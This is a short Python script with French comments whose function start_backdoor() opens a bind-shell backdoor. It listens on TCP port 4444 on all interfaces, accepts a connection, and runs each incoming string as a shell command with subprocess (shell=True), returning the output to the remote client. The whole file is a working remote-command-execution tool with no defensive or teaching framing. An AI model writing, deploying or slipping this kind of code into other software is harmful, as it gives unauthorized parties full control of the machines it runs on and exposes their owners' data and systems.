import socket 
import subprocess
import os


def start_backdoor():
    # Défintion de l'adresse IP et du port du serveur distant
    host = ''
    port = 4444

    #  Création d'un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    
    print(f"[*] Listening on {host}:{port}")

    # Attente de la connexion du client
    conn, addr = s.accept()
    print(f"[*] Connection from {addr[0]}:{addr[1]}")

    # Réception des commandes du client
    while True: 
        # Réception de la commande du client
        data = conn.recv(1024).decode()
        if not data:
            break
        print(f"[*] Received command: {data}")

        # Execution de la commande 
        if data.lower() == 'exit':
            break
        if data.startswith('cd '):
            try:
                os.chdir(data[3:])
                conn.send(str.encode(os.getcwd() + '\n'))
            except Exception as e:
                conn.send(str.encode(str(e) + '\n'))
        else:
            try:
                cmd_output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                conn.send(str.encode(cmd_output + '\n'))
            except Exception as e:
                conn.send(str.encode(str(e) + '\n'))

    # Fermeture de la connexion
    conn.close()
    s.close()

if __name__ == "__main__":
    start_backdoor()